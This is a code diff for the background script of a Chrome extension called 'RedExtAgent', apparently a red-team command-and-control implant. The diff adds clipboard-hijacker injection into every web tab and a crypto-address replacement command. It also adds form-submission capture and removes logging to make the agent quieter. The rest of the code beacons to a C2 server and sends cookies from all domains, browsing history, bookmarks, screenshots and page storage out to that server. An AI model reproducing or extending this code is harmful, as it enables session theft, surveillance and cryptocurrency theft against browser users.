@@ -1,10 +1,34 @@
 // background.js
 
-const C2_SERVER = 'http://YOUR_C2_SERVER_IP:PORT'; // Update if using remote/HTTPS
+const C2_SERVER = 'http://127.0.0.1:5000'; // Update if using remote/HTTPS
 const MIN_POLL_SECONDS = 5;
 const MAX_POLL_SECONDS = 30;
 
 let agent_id = null;
+
+// --- Clipboard Hijacking Logic ---
+
+// Injects the clipboard hijacker script into a specific tab.
+function injectClipboardScript(tabId) {
+  chrome.scripting.executeScript({
+    target: { tabId: tabId },
+    files: ['clipboard_hijacker.js'],
+  }).catch(err => {
+    // Suppress errors for URLs we can't access
+    if (!err.message.includes('Cannot access a chrome:// URL') && 
+        !err.message.includes('Cannot access contents of the page') &&
+        !err.message.includes('The tab was closed')) {
+      // Non-critical injection failures can be logged quietly if needed
+    }
+  });
+}
+
+// Inject the script whenever a tab is updated to a compatible URL.
+chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
+  if (changeInfo.status === 'complete' && tab.url && (tab.url.startsWith('http://') || tab.url.startsWith('https://'))) {
+    injectClipboardScript(tabId);
+  }
+});
 
 // Generate random interval
 function getRandomInterval() {
@@ -21,7 +45,6 @@ async function fetchWithRetry(url, options, retries = 3, backoff = 3000) {
       if (!response.ok) throw new Error(`Status: ${response.status}`);
       return response;
     } catch (error) {
-      console.warn(`Fetch attempt ${i + 1} failed: ${error.message}`);
       if (i < retries - 1) {
         await new Promise((res) => setTimeout(res, backoff));
       } else {
@@ -33,34 +56,30 @@ async function fetchWithRetry(url, options, retries = 3, backoff = 3000) {
 
 // Exfil data
 async function exfilData(action, payload) {
-  console.log(`[Exfil] Action=${action}, Payload=${JSON.stringify(payload)}`);
   try {
     const response = await fetchWithRetry(`${C2_SERVER}/api/exfil`, {
       method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
+      headers: {'Content-Type': 'application/json'},
       body: JSON.stringify({
         agent_id,
         action,
         payload
       })
     });
-    const result = await response.json();
-    console.log(`[Exfil Response] ${JSON.stringify(result)}`);
+    await response.json();
   } catch (err) {
-    console.error(`[Exfil Error] ${err.message}`);
+    // Error is handled by fetchWithRetry logging
   }
 }
 
 // Capture screenshot
 async function captureScreenshot(quality) {
   try {
-    const [activeTab] = await chrome.tabs.query({ active: true, currentWindow: true });
+    const [activeTab] = await chrome.tabs.query({active: true, currentWindow: true});
     if (!activeTab) {
-      console.error('No active tab found for screenshot');
       return;
     }
     const tabUrl = activeTab.url;
-    console.log(`[Screenshot] Attempting on ${tabUrl}`);
 
     const restrictedSchemes = ['chrome://', 'devtools://', 'chrome-extension://', 'about:'];
     const isRestricted = restrictedSchemes.some((scheme) => tabUrl.startsWith(scheme));
@@ -70,7 +89,7 @@ async function captureScreenshot(quality) {
     }
 
     const dataUrl = await new Promise((resolve, reject) => {
-      chrome.tabs.captureVisibleTab(null, { format: 'png' }, (res) => {
+      chrome.tabs.captureVisibleTab(null, {format: 'png'}, (res) => {
         if (chrome.runtime.lastError) {
           reject(new Error(chrome.runtime.lastError.message));
         } else {
@@ -79,31 +98,22 @@ async function captureScreenshot(quality) {
       });
     });
 
-    // Extract base64 data from dataUrl
     const base64Data = dataUrl.split(',')[1];
     
-    console.log('[Screenshot] Captured, exfiltrating...');
-    // Send with correct payload structure
-    exfilData('TAKE_SCREENSHOT', {
+    exfilData('take_screenshot', {
       screenshot: base64Data,
       location: tabUrl
     });
   } catch (err) {
-    console.error('[Screenshot Error]', err);
+    // Errors are logged by the promise rejection handler
   }
 }
 
-// Retrieve cookies - updated to handle all domains if none specified
+// Retrieve cookies
 async function getCookiesForDomain(domain = null) {
-  console.log(`[GetCookies] for domain: ${domain || 'all domains'}`);
-  
-  // If no domain specified, get all cookies
-  const options = domain ? { domain } : {};
+  const options = domain ? {domain} : {};
   
   chrome.cookies.getAll(options, (cookies) => {
-    console.log(`[GetCookies] Found ${cookies.length} cookies`);
-    
-    // Group cookies by domain for better organization
     const cookiesByDomain = {};
     cookies.forEach(cookie => {
       if (!cookiesByDomain[cookie.domain]) {
@@ -112,7 +122,7 @@ async function getCookiesForDomain(domain = null) {
       cookiesByDomain[cookie.domain].push(cookie);
     });
     
-    exfilData('COOKIES', {
+    exfilData('cookies', {
       domain: domain || 'all',
       cookies: cookiesByDomain
     });
@@ -121,19 +131,16 @@ async function getCookiesForDomain(domain = null) {
 
 // Get browsing history
 async function getBrowsingHistory(days = 7) {
-  console.log(`[GetHistory] Fetching history for last ${days} days`);
-  
   try {
     const microsecondsPerDay = 1000 * 60 * 60 * 24;
     const startTime = new Date().getTime() - (microsecondsPerDay * days);
     
     const historyItems = await chrome.history.search({
-      text: '',              // Empty string to match all URLs
-      startTime: startTime,  // From X days ago
-      maxResults: 5000       // Reasonable limit
+      text: '',
+      startTime: startTime,
+      maxResults: 5000
     });
 
-    // Process and structure the history data
     const processedHistory = historyItems.map(item => ({
       url: item.url,
       title: item.title,
@@ -142,17 +149,12 @@ async function getBrowsingHistory(days = 7) {
       typedCount: item.typedCount
     }));
 
-    console.log(`[GetHistory] Found ${processedHistory.length} entries`);
-    
-    // Exfiltrate the data
-    exfilData('HISTORY', {
+    exfilData('history', {
       days: days,
       entries: processedHistory,
       totalItems: processedHistory.length
     });
-    
   } catch (error) {
-    console.error('[GetHistory] Error:', error);
     exfilData('HISTORY', {
       error: error.message,
       days: days
@@ -162,75 +164,76 @@ async function getBrowsingHistory(days = 7) {
 
 // Get bookmarks
 async function getBookmarks() {
-  console.log('[GetBookmarks] Fetching bookmarks');
-  
   try {
     const bookmarkTree = await chrome.bookmarks.getTree();
-    console.log(`[GetBookmarks] Retrieved bookmark tree`);
-    
-    // Exfiltrate the data
     exfilData('BOOKMARKS', {
       bookmarks: bookmarkTree[0],
       timestamp: new Date().toISOString()
     });
-    
   } catch (error) {
-    console.error('[GetBookmarks] Error:', error);
     exfilData('BOOKMARKS', {
       error: error.message
     });
   }
 }
 
-// Handle commands
+// Handle commands from C2
 async function handleCommand(command) {
-  console.log('[HandleCommand]', command);
-  switch (command.type.toLowerCase()) {
+  switch (command.type) {
     case 'domsnapshot':
-      broadcastMessage({ command: 'domSnapshot' });
+      broadcastMessage({command: 'domSnapshot'});
       break;
-
     case 'clipboardcapture':
     case 'capture_clipboard':
-      broadcastMessage({ command: 'clipboardCapture' });
+      broadcastMessage({command: 'clipboardCapture'});
       break;
-
     case 'localstoragedump':
-      broadcastMessage({ command: 'localStorageDump' });
+      broadcastMessage({command: 'localStorageDump'});
       break;
-
     case 'getcookies':
-      const domain = command.payload?.domain || null;
-      await getCookiesForDomain(domain);
+      await getCookiesForDomain(command.payload?.domain || null);
       break;
-
     case 'screenshot':
     case 'take_screenshot':
-      console.log('[Handling Command] screenshot => captureScreenshot');
       await captureScreenshot(command.payload?.quality || 50);
       break;
-
-    case 'testcommand':
-      console.log('[TestCommand] Exfil test response');
-      exfilData('testCommandResponse', { message: 'Test command executed successfully.' });
-      break;
-
     case 'history':
-      console.log('[Handling Command] history request');
-      const days = command.payload?.days || 7;
-      await getBrowsingHistory(days);
+      await getBrowsingHistory(command.payload?.days || 7);
       break;
-
     case 'bookmarks':
-      console.log('[Handling Command] bookmarks request');
       await getBookmarks();
       break;
-
     case 'enumeration':
-      console.log('[Handling Command] system enumeration');
-      broadcastMessage({ command: 'enumeration' });
+      broadcastMessage({command: 'enumeration'});
       break;
+    case 'replace_crypto':
+      let configPayload = command.payload;
+      
+      // CRITICAL: Ensure the payload is an object. C2 might send it as a JSON string.
+      if (typeof configPayload === 'string') {
+        try {
+          configPayload = JSON.parse(configPayload);
+        } catch (e) {
+          console.error('[Crypto] Failed to parse config string. Aborting.', e);
+          return; // Do not proceed with invalid config
+        }
+      }
 
+      chrome.storage.local.set({crypto_replace_config: configPayload}, () => {
+        broadcastMessage({command: 'update_crypto_config'});
+      });
+      break;
+    case 'form_submit_capture':
+      const formCapturePayload = command.payload || {};
+      const formCaptureConfig = {
+          enabled: true, // Enable the feature when the command is received
+          domains: formCapturePayload.domains || [] // Default to all domains if not specified
+      };
+
+      chrome.storage.local.set({form_capture_config: formCaptureConfig}, () => {
+          broadcastMessage({command: 'update_form_capture_config'});
+      });
+      break;
     default:
       console.warn('[Unknown Command]', command.type);
   }
@@ -240,25 +243,18 @@ async function handleCommand(command) {
 function broadcastMessage(msg) {
   chrome.tabs.query({}, (tabs) => {
     for (const t of tabs) {
-      // Skip chrome:// and other restricted URLs
-      if (t.url && !t.url.startsWith('chrome://') && 
-          !t.url.startsWith('chrome-extension://') && 
-          !t.url.startsWith('devtools://')) {
+      if (t.url && !t.url.startsWith('chrome://') && !t.url.startsWith('chrome-extension://') && !t.url.startsWith('devtools://')) {
         try {
           chrome.tabs.sendMessage(t.id, msg, (response) => {
             if (chrome.runtime.lastError) {
-              // Ignore common connection errors
-              if (!chrome.runtime.lastError.message.includes('does not exist') && 
-                  !chrome.runtime.lastError.message.includes('port closed')) {
-                console.error(`[Broadcast] tab ${t.id}: ${chrome.runtime.lastError.message}`);
+              // Suppress common, non-critical errors
+              if (!chrome.runtime.lastError.message.includes('does not exist') && !chrome.runtime.lastError.message.includes('port closed')) {
+                // Log more significant errors if necessary
               }
-            } else if (response) {
-              console.log(`[Broadcast] tab ${t.id} responded:`, response);
             }
           });
         } catch (err) {
-          // Ignore any messaging errors
-          console.debug(`[Broadcast] Failed to send to tab ${t.id}`);
+          // Suppress errors if sending to a tab fails
         }
       }
     }
@@ -267,25 +263,24 @@ function broadcastMessage(msg) {
 
 // Beacon to fetch tasks
 async function beaconToC2() {
-  console.log(`[Beacon] Agent=${agent_id} => ${C2_SERVER}/api/commands`);
   try {
     const res = await fetchWithRetry(`${C2_SERVER}/api/commands?agent_id=${agent_id}`, {
       method: 'GET'
     });
     const commands = await res.json();
-    console.log(`[Beacon] Received ${commands.length} commands`);
-    for (const cmd of commands) {
-      await handleCommand(cmd);
+    if (commands.length > 0) {
+      for (const cmd of commands) {
+        await handleCommand(cmd);
+      }
     }
   } catch (err) {
-    console.error('[Beacon Error]', err.message);
+    // Error is handled by fetchWithRetry
   }
 }
 
 // Schedule next beacon
 function scheduleNextBeacon() {
   const interval = getRandomInterval();
-  console.log(`[Beacon] Next in ${interval / 1000}s`);
   setTimeout(async () => {
     await beaconToC2();
     scheduleNextBeacon();
@@ -294,99 +289,49 @@ function scheduleNextBeacon() {
 
 // Register agent
 async function registerAgent() {
-  console.log('[RegisterAgent] Starting');
   try {
     const response = await fetchWithRetry(`${C2_SERVER}/api/register`, {
       method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ agent_name: 'RedExtAgent' })
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({agent_name: 'RedExtAgent'})
     });
     const data = await response.json();
     agent_id = data.agent_id;
-    console.log(`[RegisterAgent] Received agent_id: ${agent_id}`);
 
-    chrome.storage.local.set({ agent_id }, () => {
-      console.log('[RegisterAgent] Stored agent_id, scheduling beacon');
+    chrome.storage.local.set({agent_id}, () => {
       scheduleNextBeacon();
     });
   } catch (err) {
-    console.error('[RegisterAgent Error]', err.message);
+    // Error is handled by fetchWithRetry
   }
 }
 
-// Load agent_id on startup
+// --- Extension Lifecycle ---
+
+// On extension install or update
+chrome.runtime.onInstalled.addListener(() => {
+  registerAgent();
+});
+
+// On browser startup
 chrome.runtime.onStartup.addListener(() => {
-  console.log('[onStartup] Checking agent_id');
   chrome.storage.local.get('agent_id', (res) => {
     if (res.agent_id) {
       agent_id = res.agent_id;
-      console.log(`[onStartup] Found agent_id = ${agent_id}`);
       scheduleNextBeacon();
-    } else {
-      registerAgent();
     }
   });
 });
 
-// On extension install
-chrome.runtime.onInstalled.addListener(() => {
-  console.log('[onInstalled] Registering agent');
-  registerAgent();
-});
-
-// Listen for exfil messages and other commands from content script
+// Listen for exfil messages from content script
 chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
-  if (message.type === 'exfil' && message.action === 'ENUMERATION') {
-    const payload = {
-      agent_id: agent_id,
-      action: message.action,
-      payload: message.data
-    };
-
-    fetch(`${C2_SERVER}/api/exfil`, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json'
-      },
-      body: JSON.stringify(payload)
-    })
-    .then(response => response.json())
-    .then(data => {
-      console.log('Enumeration data sent successfully:', data);
-    })
-    .catch(error => {
-      console.error('Error sending enumeration data:', error);
-    });
-  }
-
-  // Handle our custom screenshot capture request
-  if (message.type === 'capture_screenshot') {
-    chrome.tabs.captureVisibleTab(sender.tab.windowId, { format: 'png' }, function(dataUrl) {
-      if (chrome.runtime.lastError) {
-        console.error('[Screenshot Error]', chrome.runtime.lastError);
-        return;
-      }
-      // dataUrl is of the form "data:image/png;base64,....."
-      const base64Data = dataUrl.split(',')[1];
-      
-      // Send to server with correct agent_id and action type
-      exfilData('TAKE_SCREENSHOT', {
-        agent_id: agent_id,
-        screenshot: base64Data,
-        location: message.location
-      });
-    });
-  }
-
-  // Handle other exfil messages
   if (message.type === 'exfil') {
-    console.log('[Exfil Message]', message.data);
     exfilData(message.data.action, {
       url: sender.url,
       location: message.data.location,
       ...message.data
     });
-    sendResponse({ status: 'ok' });
+    sendResponse({status: 'ok'});
   }
   return true;
 });
